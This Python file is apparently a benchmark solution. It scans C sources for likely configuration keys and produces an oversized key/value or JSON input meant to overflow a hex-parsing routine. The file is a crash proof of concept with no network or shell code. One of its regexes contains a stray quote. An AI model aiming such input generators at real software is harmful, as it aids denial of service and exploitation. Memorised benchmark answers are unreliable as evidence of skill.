import tarfile
import re
import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            all_text, string_literals = self._read_sources(src_path)
        except Exception:
            return self._generic_poc()

        config_type = self._detect_config_type(all_text)
        keys = self._extract_candidate_keys(all_text, string_literals)

        if not keys:
            keys = {
                "hex",
                "hex_value",
                "key",
                "id",
                "color",
                "session_hex",
                "token",
                "mac",
                "hash",
                "secret",
                "data",
            }

        keys_list = list(keys)
        if len(keys_list) > 30:
            keys_list = keys_list[:30]

        if config_type == "json":
            return self._build_json_poc(keys_list)
        else:
            return self._build_kv_poc(keys_list)

    # --------- Source reading and analysis helpers ---------

    def _read_sources(self, src_path):
        texts = []
        string_literals = []

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fname in files:
                    if self._is_source_file(fname):
                        path = os.path.join(root, fname)
                        try:
                            with open(path, "rb") as f:
                                data = f.read()
                        except Exception:
                            continue
                        text = data.decode("utf-8", errors="ignore")
                        texts.append(text)
                        string_literals.extend(self._extract_string_literals(text))
        else:
            try:
                tf = tarfile.open(src_path, "r:*")
            except Exception:
                return "", []
            try:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = os.path.basename(member.name)
                    if not self._is_source_file(name):
                        continue
                    f = tf.extractfile(member)
                    if not f:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    text = data.decode("utf-8", errors="ignore")
                    texts.append(text)
                    string_literals.extend(self._extract_string_literals(text))
            finally:
                tf.close()

        all_text = "\n".join(texts)
        return all_text, string_literals

    def _is_source_file(self, name: str) -> bool:
        lname = name.lower()
        return lname.endswith(
            (
                ".c",
                ".h",
                ".cc",
                ".hh",
                ".cpp",
                ".hpp",
                ".inl",
                ".txt",
                ".md",
            )
        )

    def _extract_string_literals(self, text):
        lits = []
        for m in re.finditer(r'"([^"\\]*(?:\\.[^"\\]*)*)"', text):
            lit = m.group(1)
            try:
                lit_u = bytes(lit, "utf-8").decode("unicode_escape", errors="ignore")
            except Exception:
                lit_u = lit
            lits.append(lit_u)
        return lits

    def _detect_config_type(self, all_text: str) -> str:
        low = all_text.lower()
        if (
            "json_object_get" in all_text
            or "json_t" in all_text
            or "cjson" in low
            or "jansson" in low
            or "json_parse" in low
            or "json_loads" in low
            or "json_tokener" in low
        ):
            return "json"
        return "kv"

    def _looks_like_key(self, lit: str) -> bool:
        if not lit:
            return False
        if len(lit) > 32:
            return False
        if lit.startswith("%"):
            return False
        if any(ch.isspace() for ch in lit):
            return False
        if not re.match(r"^[A-Za-z0-9_.:-]+$", lit):
            return False
        if lit.startswith("/"):
            return False
        ext = os.path.splitext(lit)[1].lower()
        if ext in {".c", ".h", ".cpp", ".hpp", ".cc", ".hh"}:
            return False
        return True

    def _extract_candidate_keys(self, all_text: str, string_literals):
        keys = set()

        # From strcmp / strncmp patterns
        patterns = [
            r'strcmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*\)',
            r'strcmp\s*\(\s*"([^"]+)"\s*,\s*[^)]+\)',
            r'strncmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*",',
            r'strncmp\s*\(\s*"([^"]+)"\s*,\s*[^,]+,',
        ]
        for pat in patterns:
            for m in re.finditer(pat, all_text):
                lit = m.group(1)
                if self._looks_like_key(lit):
                    keys.add(lit)

        # JSON-specific key extraction
        for m in re.finditer(r'json_object_get\s*\([^,]+,\s*"([^"]+)"\s*\)', all_text):
            lit = m.group(1)
            if self._looks_like_key(lit):
                keys.add(lit)

        # Prefer literals that explicitly mention 'hex'
        for lit in string_literals:
            if "hex" in lit.lower() and self._looks_like_key(lit):
                keys.add(lit)

        # If still few keys, supplement with general-looking literals
        if len(keys) < 5:
            for lit in string_literals:
                if self._looks_like_key(lit):
                    keys.add(lit)
                    if len(keys) >= 20:
                        break

        return keys

    # --------- PoC builders ---------

    def _long_hex_string(self, min_len: int = 4096) -> str:
        length = min_len
        if length % 2 == 1:
            length += 1
        return "A" * length

    def _build_kv_poc(self, keys) -> bytes:
        hex_str1 = self._long_hex_string(4096)
        hex_str2 = self._long_hex_string(6144)

        lines = []

        for key in keys:
            k = key.replace("\n", "").replace("\r", "")
            if not k:
                continue
            # Various common key/value syntaxes
            lines.append(f"{k} {hex_str1}")
            lines.append(f"{k}={hex_str1}")
            lines.append(f"{k} = {hex_str1}")
            lines.append(f"{k}:{hex_str1}")
            lines.append(f"{k}: {hex_str1}")

        # Add some generic hex-related keys as extra coverage
        generic_keys = ["hex", "hex_value", "id", "key", "secret", "token", "mac"]
        for key in generic_keys:
            lines.append(f"{key} {hex_str2}")
            lines.append(f"{key}={hex_str2}")
            lines.append(f"{key} = {hex_str2}")
            lines.append(f"{key}:{hex_str2}")
            lines.append(f"{key}: {hex_str2}")

        poc_str = "\n".join(lines) + "\n"
        return poc_str.encode("ascii", errors="ignore")

    def _build_json_poc(self, keys) -> bytes:
        hex_str1 = self._long_hex_string(4096)
        hex_str2 = self._long_hex_string(6144)

        items = []
        used_keys = set()

        for idx, key in enumerate(keys):
            k = key.replace("\\", "\\\\").replace('"', "")
            if not k or k in used_keys:
                continue
            used_keys.add(k)
            val = hex_str1 if idx % 2 == 0 else hex_str2
            items.append(f'"{k}":"{val}"')
            if len(items) >= 20:
                break

        for gk in ["hex", "hex_value", "id", "key", "secret", "token", "color", "mac"]:
            if gk not in used_keys:
                items.append(f'"{gk}":"{hex_str1}"')

        obj = "{" + ",".join(items) + "}"
        return obj.encode("ascii", errors="ignore")

    def _generic_poc(self) -> bytes:
        hex_str = self._long_hex_string(4096)
        s = "hex=" + hex_str + "\n"
        return s.encode("ascii", errors="ignore")